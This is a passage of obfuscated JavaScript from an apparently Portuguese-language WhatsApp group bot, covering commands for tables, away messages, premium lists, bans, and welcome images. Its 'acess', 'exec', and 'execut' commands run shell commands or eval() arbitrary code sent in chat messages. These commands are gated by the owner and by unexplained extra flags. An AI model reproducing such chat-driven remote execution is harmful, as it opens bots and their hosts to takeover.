              datinhaofc = moment.tz("America/Sao_Paulo").format("DD/MM/YY");
              const _0x31e184 = {
                Horario: msgtmpol,
                Data: datinhaofc,
                Tabela: msgz
              };
              fs.writeFileSync("./DADOS/json/TABELA/tabela-" + _0x346d97 + ".json", JSON.stringify(_0x31e184, null, 2));
              _0x50740b("Tabela do grupo foi criada com sucesso..");
              break;
            case "tabelagp":
            case "tabeladogp":
            case "tabelinha":
              if (!fs.existsSync("./DADOS/json/TABELA/tabela-" + _0x346d97 + ".json")) {
                return _0x50740b("Cade a tabela, cria ela com o comando\nExemplo : " + _0x141936 + "criartabela lindas do grupo : e etc ..");
              }
              const _0x701427 = JSON.parse(fs.readFileSync("./DADOS/json/TABELA/tabela-" + _0x346d97 + ".json"));
              blity = "- ⏰ Horário que criou a Tabela : " + _0x701427.Horario + "\n\n- 🗓️ Data que criou a Tabela : " + _0x701427.Data + "\n\n - Tabela : " + _0x701427.Tabela;
              _0x5dcc57(blity);
              break;
            case "ativo":
            case 'on':
            case "voltei":
              if (!_0x3f2f63 && !_0xf59944) {
                return _0x50740b("Comando apenas para administradores ou dono..");
              }
              if (_0x405e7d) {
                if (fs.existsSync("./DADOS/json/afk-@" + numerodono_ofc + ".json")) {
                  DLT_FL("./DADOS/json/afk-@" + numerodono_ofc + ".json");
                  _0x50740b("Bem vindo de volta, agora você está online 🙂");
                } else {
                  _0x50740b("Você não registrou nenhuma mensagem de ausência...");
                }
              } else {
                if (_0x3f2f63) {
                  if (!JSON.stringify(_0x326cbd[0].ausentes).includes(_0x246d48)) {
                    return _0x50740b("Não há nenhum registro de ausência sua..");
                  }
                  _0x326cbd[0].ausentes.splice(_0x326cbd[0].ausentes.map(_0x146db1 => _0x146db1.id).indexOf(_0x246d48), 1);
                  _0x137e44(_0x326cbd);
                  _0x50740b("Registro de ausência tirada com sucesso...");
                }
              }
              break;
            case "ausente":
            case "off":
            case "afk":
              if (!_0x3f2f63 && !_0xf59944) {
                return _0x50740b("Comando apenas para administradores ou dono..");
              }
              if (_0x405e7d) {
                msgtmp = moment.tz("America/Sao_Paulo").format("HH:mm:ss");
                const _0x347a44 = {
                  Ausente_Desde: msgtmp,
                  Motivo_Da_Ausência: _0x11e99e
                };
                fs.writeFileSync("./DADOS/json/afk-@" + setting.numerodono.replace(new RegExp("[()+-/ +/]", 'gi'), '') + ".json", JSON.stringify(_0x347a44, null, 2));
                _0x50740b("Mensagem de ausência criada com sucesso...");
              } else {
                if (_0x3f2f63) {
                  if (!_0x11e99e.trim()) {
                    return _0x50740b("Digite a mensagem de ausência, Exemplo: " + (_0x141936 + _0x267d4b) + " Estou tomando banho");
                  }
                  if (!JSON.stringify(_0x326cbd[0].ausentes).includes(_0x246d48)) {
                    _0x326cbd[0].ausentes.push({
                      'id': _0x246d48,
                      'msg': _0x11e99e.trim()
                    });
                    _0x137e44(_0x326cbd);
                    _0x50740b("Mensagem de ausência criada com sucesso..\n\nSe deseja Desativar a mensagem de ausência use o comando ativo");
                  } else {
                    _0x326cbd[0].ausentes[_0x326cbd[0].ausentes.map(_0x20c742 => _0x20c742.id).indexOf(_0x246d48)].msg = _0x11e99e.trim();
                    _0x137e44(_0x326cbd);
                    _0x50740b("Mensagem de ausência alterada com sucesso..\n\nSe deseja Desativar a mensagem de ausência use o comando ativo");
                  }
                } else {
                  return _0x50740b("Comando apenas para administradores e dono do bot..");
                }
              }
              break;
            case "serpremium":
            case "serprem":
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              premium.push(_0xbd10de);
              fs.writeFileSync("./DADOS/json/premium.json", JSON.stringify(premium));
              _0x5dcc57("Pronto @" + numerodono_ofc + " você foi adicionado na lista premium.");
              break;
            case "reagir":
              const _0x834ff3 = {
                text: '💖',
                key: _0xd2050d.key
              };
              const _0x3e4123 = {
                react: _0x834ff3
              };
              var _0x4f0b32 = _0x3e4123;
              sendMsg = _0x5196be.sendMessage(_0x346d97, _0x4f0b32);
              break;
            case "iniciar_o_jogo":
              if (jogo_iniciado) {
                return _0x50740b("o jogo já foi iniciado, aguarde terminar..");
              }
              _0x1106fd("- " + _0x33c0c0 + " Atenção a todos do grupo, o Usuário @" + _0x45b1c6 + " iniciou o jogo ", _0x246d48);
              break;
            case "addcmdgold":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              var [_0xdef020, _0x4fc6e6] = _0x11e99e.trim().toLowerCase().split('/');
              if (_0xdef020 && _0x4fc6e6) {
                if (_0x326cbd[0]?.["comandos_gold"]?.["length"] >= 1 && _0x326cbd[0].comandos_gold.some(_0x18f258 => _0x18f258.comando === _0xdef020)) {
                  return _0x50740b("Este comando, já encontra incluso na lista gold.");
                }
                const _0x1a8f5a = {
                  comando: _0xdef020,
                  gold: _0x4fc6e6
                };
                const _0x43510c = {
                  comando: _0xdef020,
                  gold: _0x4fc6e6
                };
                if (!_0x326cbd[0].comandos_gold) {
                  _0x326cbd[0].comandos_gold = [_0x1a8f5a];
                } else {
                  _0x326cbd[0]?.["comandos_gold"]["push"](_0x43510c);
                }
                _0x137e44(_0x326cbd);
                _0x50740b("Comando -> " + _0xdef020 + " adicionado com sucesso na lista de comandos golds, que só vão ser executado com consumo gold, após usuários executar o comando.");
              } else {
                return _0x50740b("Faltando o(a) " + (!_0xdef020 ? "comando" : !_0x11e99e.trim().includes('/') ? '/' : "gold") + ", Exemplo: " + (_0x141936 + _0x267d4b) + " play/3 *Este exemplo ele adicionará o comando play como um comando gold, que após ativar o " + _0x141936 + "sistemgold, só poderá ser usado consumindo gold do usuário que usar o comando, se não tiver gold, o usuário não terá como usar o comando play.");
              }
              break;
            case "rmcmdgold":
            case "delcmdgold":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (!_0x11e99e.trim()) {
                return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " play");
              }
              if (!_0x326cbd[0].comandos_gold.some(_0x27b15a => _0x27b15a.comando === _0x11e99e.trim().toLowerCase())) {
                return _0x50740b("Este comando não se encontra na lista gold, então não é possível eu remover algo inexistente.");
              }
              _0x326cbd[0].comandos_gold.splice(_0x326cbd[0].comandos_gold.findIndex(_0xd66fa0 => _0xd66fa0 === _0x11e99e.trim().toLowerCase()), 1);
              _0x137e44(_0x326cbd);
              _0x50740b("Comando -> " + _0x11e99e.trim() + " tirado com sucesso da lista de comandos golds.");
              break;
            case "addcmdpremium":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (nescessario.cmdpremium.includes(_0x11e99e.replace(_0x141936, '').trim())) {
                return _0x50740b("Este comando já se encontra na lista premium.");
              }
              nescessario.cmdpremium.push(_0x11e99e.replace(_0x141936, '').trim());
              cmdpremium = nescessario.cmdpremium;
              _0x13c255(nescessario);
              _0x50740b("Comando " + _0x11e99e.trim() + " adicionado para apenas usuarios premium tirar");
              break;
            case "tirarcmdpremium":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!nescessario.cmdpremium.includes(_0x11e99e.replace(_0x141936, '').trim())) {
                return _0x50740b("Este comando não é premium, não esta na lista para ser tirado.");
              }
              nescessario.cmdpremium.splice(nescessario.cmdpremium.indexOf(_0x11e99e.replace(_0x141936, '').trim()), 1);
              cmdpremium = nescessario.cmdpremium;
              _0x13c255(nescessario);
              _0x50740b("Comando " + _0x11e99e.trim() + " tirado da lista premium.");
              break;
            case "cmdpremium":
              {
                if (nescessario.cmdpremium.length == 0) {
                  return _0x50740b("Não contém nenhum comando na lista Premium");
                }
                let _0x5025c7 = "Comandos Premium:\n\n";
                for (_0x3194f3 of nescessario.cmdpremium) {
                  _0x5025c7 += "_- " + _0x3194f3 + "\n\n";
                }
                _0x50740b(_0x5025c7);
              }
              break;
            case "addlistabranca":
            case "addwhitelist":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x3e445f) {
                return _0x50740b("Marque o usuário do grupo ou digite o número do usuário ou marque a mensagem dele..");
              }
              _0xf9c182 = UsuWhiteL.includes(_0x3e445f);
              if (_0xf9c182) {
                return _0x50740b("*Este número já está incluso..*");
              }
              UsuWhiteL.push(_0x3e445f);
              fs.writeFileSync("./DADOS/json/UsuWhiteL.json", JSON.stringify(UsuWhiteL));
              const _0x4d0844 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': "👑@" + _0x3e445f.split('@')[0] + " foi adicionado à lista branca com sucesso👑",
                'mentions': [_0x3e445f]
              }, _0x4d0844);
              break;
            case "dellistabranca":
            case "delwhitelist":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x3e445f) {
                return _0x50740b("Marque o usuário do grupo ou digite o número do usuário ou marque a mensagem dele..");
              }
              if (!UsuWhiteL.includes(_0x3e445f)) {
                return _0x50740b("*Este número não está incluso na lista branca..*");
              }
              pesquisar = _0x3e445f;
              processo = UsuWhiteL.indexOf(pesquisar);
              while (processo >= 0) {
                UsuWhiteL.splice(processo, 1);
                processo = UsuWhiteL.indexOf(pesquisar);
              }
              fs.writeFileSync("./DADOS/json/UsuWhiteL.json", JSON.stringify(UsuWhiteL));
              const _0x8a6b1f = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': " @" + _0x3e445f.split('@')[0] + " foi tirado da lista branca com sucesso..",
                'mentions': [_0x3e445f]
              }, _0x8a6b1f);
              break;
            case "whitelist":
            case "listabranca":
              {
                tkks = "╭────*「 *LISTA BRANCA 👑* 」\n";
                for (let _0x4816ad of UsuWhiteL) {
                  tkks += "│+  @" + _0x4816ad.split('@')[0] + "\n";
                }
                tkks += "│+ Total : " + UsuWhiteL.length + "\n╰──────*「 *" + NomeDoBot + "* 」*────";
                _0x5dcc57(tkks.trim());
              }
              break;
            case "premiumlista":
            case "listapremium":
              {
                tkks = "╭────*「 *PREMIUM USER👑* 」\n";
                for (let _0x394905 of premium) {
                  tkks += "│+  @" + _0x394905.split('@')[0] + "\n";
                }
                tkks += "│+ Total : " + premium.length + "\n╰──────*「 *" + NomeDoBot + "* 」*────";
                _0x5dcc57(tkks.trim());
              }
              break;
            case "addpremium":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x3e445f) {
                return _0x50740b("Marque o usuário do grupo ou digite o número do usuário ou marque a mensagem dele..");
              }
              _0xf9c182 = premium.includes(_0x3e445f);
              if (_0xf9c182) {
                return _0x50740b("*Este número já está incluso..*");
              }
              premium.push(_0x3e445f);
              fs.writeFileSync("./DADOS/json/premium.json", JSON.stringify(premium));
              const _0x29fd9f = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': "👑@" + _0x3e445f.split('@')[0] + " foi adicionado à lista de usuários premium com sucesso👑",
                'mentions': [_0x3e445f]
              }, _0x29fd9f);
              break;
            case "delpremium":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x3e445f) {
                return _0x50740b("Marque o usuário do grupo ou digite o número do usuário ou marque a mensagem dele..");
              }
              if (!premium.includes(_0x3e445f)) {
                return _0x50740b("*Este número não está incluso na lista premium..*");
              }
              pesquisar = _0x3e445f;
              processo = premium.indexOf(pesquisar);
              while (processo >= 0) {
                premium.splice(processo, 1);
                processo = premium.indexOf(pesquisar);
              }
              fs.writeFileSync("./DADOS/json/premium.json", JSON.stringify(premium));
              const _0x58504e = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': " @" + _0x3e445f.split('@')[0] + " foi tirado da lista premium com sucesso..",
                'mentions': [_0x3e445f]
              }, _0x58504e);
              break;
            case "limpar":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              clear = "🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅";
              const _0x7f03d0 = {
                text: clear
              };
              const _0x2adfd7 = {
                forwardingScore: 0x1f4,
                isForwarded: true
              };
              const _0x46b136 = {
                quoted: _0xd2050d,
                contextInfo: _0x2adfd7
              };
              _0x5196be.sendMessage(_0x346d97, _0x7f03d0, _0x46b136);
              break;
            case 'd_':
              if (!_0x33286a) {
                return _0x50740b("Apenas premium..");
              }
              _0x5196be.sendMessage(_0x346d97, {
                'delete': {
                  'remoteJid': _0x346d97,
                  'fromMe': false,
                  'id': _0xd2050d.message.buttonsResponseMessage.contextInfo.stanzaId,
                  'participant': _0x517366
                }
              });
              break;
            case "deletar":
            case "delete":
            case "del":
            case 'd':
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42d32c) {
                return _0x50740b("Marque a mensagem do usuário que deseja apagar, do bot ou de alguém..");
              }
              _0x5196be.sendMessage(_0x346d97, {
                'delete': {
                  'remoteJid': _0x346d97,
                  'fromMe': false,
                  'id': _0xd2050d.message.extendedTextMessage.contextInfo.stanzaId,
                  'participant': _0x42d32c
                }
              });
              break;
            case "fundobemvindo":
            case "fundobv":
              if (!_0xf59944 && !_0x3eefd0 && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x54198a) {
                return _0x50740b("Marque uma imagem");
              }
              _0x50740b("Você deve marcar uma imagem com esse comando, se não for de primeira, tente novamente, ok? ");
              if ((_0x39e519 && !_0xd2050d.message.videoMessage || _0x54198a || _0xee3727) && !_0x11e99e.length <= 1) {
                _0x48d7b9 = _0x54198a || _0xee3727 ? JSON.parse(JSON.stringify(_0xd2050d).replace("quotedM", 'm')).message.extendedTextMessage.contextInfo.message.imageMessage : _0xd2050d;
                owgi = await getFileBuffer(_0x48d7b9, "image");
                _0x36d5cf = await upload(owgi);
                _0x46a242[0].wellcome[0].fundo1 = _0x36d5cf;
                filePath1 = "./DADOS/grupos/" + _0x346d97 + ".json";
                fs.writeFileSync(filePath1, JSON.stringify(_0x46a242, null, 2));
                _0x50740b("A imagem de bem vindo foi alterada com sucesso para: " + _0x46a242[0].wellcome[0].fundo1);
              }
              break;
            case "fundosaiu":
              if (!_0xf59944 && !_0x3eefd0 && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x54198a) {
                return _0x50740b("Marque uma imagem");
              }
              _0x50740b("Você deve marcar uma imagem com esse comando, se não for de primeira, tente novamente, ok? ");
              if ((_0x39e519 && !_0xd2050d.message.videoMessage || _0x54198a || _0xee3727) && !_0x11e99e.length <= 1) {
                _0x48d7b9 = _0x54198a || _0xee3727 ? JSON.parse(JSON.stringify(_0xd2050d).replace("quotedM", 'm')).message.extendedTextMessage.contextInfo.message.imageMessage : _0xd2050d;
                owgi = await getFileBuffer(_0x48d7b9, "image");
                _0x36d5cf = await upload(owgi);
                _0x46a242[0].wellcome[0].fundo2 = _0x36d5cf;
                filePath2 = "./DADOS/grupos/" + _0x346d97 + ".json";
                fs.writeFileSync(filePath2, JSON.stringify(_0x46a242, null, 2));
                _0x50740b("A imagem de saiu foi alterada com sucesso para: " + _0x46a242[0].wellcome[0].fundo2);
              }
              break;
            case "antiligar":
            case "antiligacao":
            case "antiligação":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              nescessario.anticall = !nescessario.anticall;
              _0x13c255(nescessario);
              _0x50740b(nescessario.anticall ? "Anti ligação ativado para o bot. As chamadas serão bloqueadas." : "Anti ligação desativado para o bot.");
              break;
            case "antipv":
            case "antipv2":
            case "antipv3":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (_0x267d4b === "antipv" && nescessario.antipv) {
                nescessario.antipv = false;
              } else {
                if (_0x267d4b === "antipv2" && nescessario.antipv2) {
                  nescessario.antipv2 = false;
                } else {
                  if (_0x267d4b === "antipv3" && nescessario.antipv3) {
                    nescessario.antipv3 = false;
                  } else {
                    if (_0x267d4b === "antipv") {
                      nescessario.antipv = true;
                      nescessario.antipv2 = false;
                      nescessario.antipv3 = false;
                    } else {
                      if (_0x267d4b === "antipv2") {
                        nescessario.antipv2 = true;
                        nescessario.antipv = false;
                        nescessario.antipv3 = false;
                      } else {
                        if (_0x267d4b === "antipv3") {
                          nescessario.antipv3 = true;
                          nescessario.antipv = false;
                          nescessario.antipv2 = false;
                        }
                      }
                    }
                  }
                }
              }
              _0x13c255(nescessario);
              if (nescessario.antipv) {
                _0x50740b("Ativando anti privado para o bot...\ncaso mandem mensagem para o bot, eles serão bloqueados.");
              } else {
                if (nescessario.antipv2) {
                  _0x50740b("Sucesso! Alterado para modo antipv2, pv não poderá ser utilizado, mas não bloquearei, só floodarei uma mensagem a cada mensagem dele.");
                } else {
                  if (nescessario.antipv3) {
                    _0x50740b("Anti Pv3 ativado com sucesso! Irei ignorar todas as mensagens recebidas no privado, exceto do Dono e de usuários premium.");
                  } else {
                    _0x50740b("Desativando todos os modos antipv.");
                  }
                }
              }
              break;
            case "msgantipv":
              {
                if (!_0xf59944) {
                  return _0x50740b("Este comando é apenas para o meu dono utilizar...");
                }
                if (!_0x11e99e.trim()) {
                  return _0x50740b("KD a mensagem para eu por no antipv");
                }
                let _0x39a9a9 = _0x11e99e.trim().replace(/\n/g, "\n");
                msgantipv1 = _0x39a9a9;
                nescessario.msgantipv1 = _0x39a9a9;
                _0x13c255(nescessario);
                _0x50740b("Mensagem do antipv foi alterada.");
                setTimeout(() => {
                  process.exit();
                }, 1000);
              }
              break;
            case "msgantipv2":
              {
                if (!_0xf59944) {
                  return _0x50740b("Este comando é apenas para o meu dono utilizar...");
                }
                if (!_0x11e99e.trim()) {
                  return _0x50740b("KD a mensagem para eu por no antipv2");
                }
                let _0x349025 = _0x11e99e.trim().replace(/\n/g, "\n");
                msgantipv2 = _0x349025;
                nescessario.msgantipv2 = _0x349025;
                _0x13c255(nescessario);
                _0x50740b("Mensagem do antipv2 foi alterada.");
                setTimeout(() => {
                  process.exit();
                }, 1000);
              }
              break;
            case "block":
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              var _0xa18054 = _0xd79836?.["length"] === 1 ? _0xd79836[0] : _0x42d32c ? _0x42d32c : _0x11e99e.trim() ? _0x11e99e.replace(new RegExp("[()+-/ @+/]", 'gi'), '') + "@s.whatsapp.net" : false;
              if (!_0x42d32c && !_0xd79836 && !_0x11e99e.trim()) {
                return _0x50740b("Marque o @ do usuário que deseja bloquear de ele utilizar os comandos, ou o número da fórma que copiar...");
              }
              var _0x197a6f = ban.indexOf(_0xa18054);
              if (_0x197a6f >= 0) {
                return _0x50740b("*Esse Número ja esta incluso*");
              }
              ban.push(_0xa18054);
              fs.writeFileSync("./DADOS/datab/usuarios/banned.json", JSON.stringify(ban));
              susp = "🚫@" + _0xa18054.split('@')[0] + " foi banido e não poderá mais usar os comandos do bot🚫";
              const _0x317fb5 = {
                text: susp,
                mentions: [_0xa18054]
              };
              _0x5196be.sendMessage(_0x346d97, _0x317fb5);
              break;
            case "unblock":
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              var _0xa18054 = _0xd79836?.["length"] === 1 ? _0xd79836[0] : _0x42d32c ? _0x42d32c : _0x11e99e.trim() ? _0x11e99e.replace(new RegExp("[()+-/ @+/]", 'gi'), '') + "@s.whatsapp.net" : false;
              if (!_0x42d32c && !_0xd79836 && !_0x11e99e.trim()) {
                return _0x50740b("Marque o @ do usuário que deseja desbloquear pra ele utilizar os comandos, ou o número da fórma que copiar...");
              }
              var _0x137e5a = ban.indexOf(_0xa18054);
              if (_0x137e5a < 0) {
                return _0x50740b("*Esse número não está incluso*");
              }
              pesquisar = _0xa18054;
              processo = ban.indexOf(pesquisar);
              while (processo >= 0) {
                ban.splice(processo, 1);
                processo = ban.indexOf(pesquisar);
              }
              fs.writeFileSync("./DADOS/datab/usuarios/banned.json", JSON.stringify(ban));
              susp = '@' + _0xa18054.split('@')[0] + " foi desbanido e poderá novamente usar os comandos do bot❎";
              const _0x577f3a = {
                text: susp,
                mentions: [_0xa18054]
              };
              _0x5196be.sendMessage(_0x346d97, _0x577f3a);
              break;
            case "blocklist":
              jrc = "ESTA É A LISTA DE NÚMEROS BLOQUEADOS :\n";
              for (let _0x5f3e26 of ban) {
                jrc += "~> @" + _0x5f3e26.split('@')[0] + "\n";
              }
              jrc += "Total : " + ban.length;
              _0x5196be.sendMessage(_0x346d97, {
                'text': jrc.trim(),
                'mentions': ban
              });
              break;
            case "acess":
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              teks = _0x3ac611.slice(7);
              exec(teks, (_0x296ffa, _0x2f5c6a) => {
                const _0x559057 = {
                  quoted: _0xd2050d
                };
                if (_0x296ffa) {
                  return _0x5196be.sendMessage(_0x346d97, {
                    'text': "root@ALEATORY-BOT:~ " + _0x296ffa
                  }, _0x559057);
                }
                if (_0x2f5c6a) {
                  const _0x2e1742 = {
                    text: _0x2f5c6a
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x2e1742);
                }
              });
              break;
            case "execut":
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt) {
                return;
              }
              try {
                return eval("(async() => { " + _0x23d865.join(" ") + "})()");
              } catch (_0x2567ed) {
                const _0x47e8ec = {
                  text: '' + _0x2567ed
                };
                _0x5196be.sendMessage(_0x346d97, _0x47e8ec);
              }
              break;
            case "exec":
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt) {
                return;
              }
              try {
                paramsQuoted = _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.conversation || _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage.text;
                return eval('' + paramsQuoted);
                console.log("[EXEC]~> " + paramsQuoted);
              } catch (_0x3b7cb7) {
                _0x50740b(_0x3b7cb7);
              }
              break;
            case "sender":
              _0xf9c182 = _0x89cd51 ? _0xd2050d.key.participant : _0xd2050d.key.remoteJid;
              _0x50740b(_0xf9c182);
              break;
            case "ping2":
              if (!_0x89cd51) {
                return _0x50740b(enviar.msg.grupo);
              }
              if (!_0x33286a && !_0xf59944 && !_0x3f2f63) {
                return _0x50740b(enviar.msg.premium);
              }
              varping = speed();
              ping = speed() - varping;
              _0xbce007 = await _0x5196be.groupFetchAllParticipating();
              uptime = process.uptime();
              _0x32d8bd = Object.entries(_0xbce007).slice(0).map(_0x138b37 => _0x138b37[1]);
              ramus = "⚙️ 𝐑𝐀𝐌 𝐔𝐒𝐀𝐃𝐀: " + (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2) + "MB\n\n💻 𝐓𝐎𝐓𝐀𝐋 𝐃𝐄 𝐑𝐀𝐌: " + Math.round(require('os').totalmem / 1024 / 1024) + 'MB';
              FiltroDeComu = _0x32d8bd.filter(_0x3681e4 => !_0x3681e4.isCommunity);
              tcomuni = _0x32d8bd.filter(_0x3cb25a => _0x3cb25a.isCommunity === true).length;
              const _0x35027c = {
                displayText: _0x2cd689 + " 𝐚𝐭𝐢𝐯𝐚𝐫/𝐝𝐞𝐬𝐚𝐭𝐢𝐯𝐚𝐫 𝐟𝐮𝐧𝐜̧𝐨̃𝐞𝐬 " + _0x2cd689
              };
              const _0x36b3ea = {
                buttonId: _0x141936 + "ativacoes",
                buttonText: _0x35027c,
                type: 0x1
              };
              _0x3c2c3a(_0x346d97, "https://urglyhys.sirv.com/Images/1656520426693_polarr.jpg?profile=Img&text.0.text=" + ping.toFixed(4) + "&text.0.color=aca4ef&text.0.background.color=000000&text.0.background.opacity=0&text.0.outline.opacity=71", NomeDoBot + "\n\n🗣️ 𝐍𝐎𝐌𝐄: " + _0x671b4b + "*\n\n📱 𝐍𝐔́𝐌𝐄𝐑𝐎: " + _0x246d48.split('@')[0] + "\n\n👥 𝐆𝐑𝐔𝐏𝐎: " + _0x3baffe + "\n\n👮 𝐀𝐃𝐌𝐈𝐍𝐒:  " + _0x1c25a7.length + "\n\n👻 𝐌𝐄𝐌𝐁𝐑𝐎𝐒: " + groupMembers.length + "\n\n🫂 𝐓𝐎𝐓𝐀𝐋 𝐃𝐄 𝐆𝐑𝐔𝐏𝐎𝐒: " + FiltroDeComu.length + "\n\n💭 𝐂𝐎𝐌𝐔𝐍𝐈𝐃𝐀𝐃𝐄𝐒: " + tcomuni + "\n\n" + ramus + "\n\n🤖 𝐓𝐄𝐌𝐏𝐎 𝐀𝐓𝐈𝐕𝐎: " + kyun(uptime), '' + NomeDoBot, [_0x36b3ea], _0xd2050d);
              break;
            case "dados":
            case "ping":
              {
                let {
                  sizeFormatter: _0x19f038
                } = require("human-readable");
                let _0x543389 = require('os');
                function _0x560579(_0x54e6d0) {
                  let _0x37af63 = ["dia", "hora", "minuto", "segundo"];
                  let _0x441447 = [86400, 3600, 60, 1];
                  let _0x5d7674 = '';
                  for (let _0x332217 = 0; _0x332217 < _0x37af63.length; _0x332217++) {
                    let _0x26d169 = Math.floor(_0x54e6d0 / _0x441447[_0x332217]);
                    _0x54e6d0 -= _0x26d169 * _0x441447[_0x332217];
                    if (_0x26d169 > 0) {
                      _0x5d7674 += _0x26d169 + " " + _0x37af63[_0x332217] + (_0x26d169 > 1 ? 's' : '') + " ";
                    }
                  }
                  return _0x5d7674.trim();
                }
                let _0x4bc991 = process.memoryUsage().heapUsed / 1024 / 1024;
                let _0x3afe34 = _0x4bc991 > 1024 ? 'GB' : 'MB';
                let _0x54fb53 = _0x3afe34 === 'GB' ? _0x4bc991 / 1024 : _0x4bc991;
                let _0x573d71 = _0x54fb53 !== 1 ? '' : '';
                let _0x5600cb = Date.now() / 1000 - _0xd2050d.messageTimestamp;
                let _0x4421b4 = _0x5600cb < 1 ? Math.round(_0x5600cb * 1000) + " Ms" : Math.round(_0x5600cb) + " S";
                let _0x34977f = process.uptime();
                let _0x2bde6f = _0x19f038({
                  'std': "JEDEC",
                  'decimalPlaces': '2',
                  'keepTrailingZeroes': false,
                  'render': (_0x382735, _0x1ada30) => _0x382735 + " " + _0x1ada30 + 'B'
                });
                let _0x5c7cc1 = _0x560579(_0x34977f);
                function _0x1e207f(_0x1f42cc) {
                  return _0x1f42cc.replace(/[^\p{L}\p{N}\s]/gu, '').trim();
                }
                let _0x27bb2f = NomeDoBot.replace(/[^\p{L}\p{N}\s]/gu, '').trim();
                let _0x2859c3 = _0x543389.totalmem();
                let _0x3c8ee1 = _0x543389.freemem();
                let _0x5081b4 = _0x2859c3 - _0x3c8ee1;
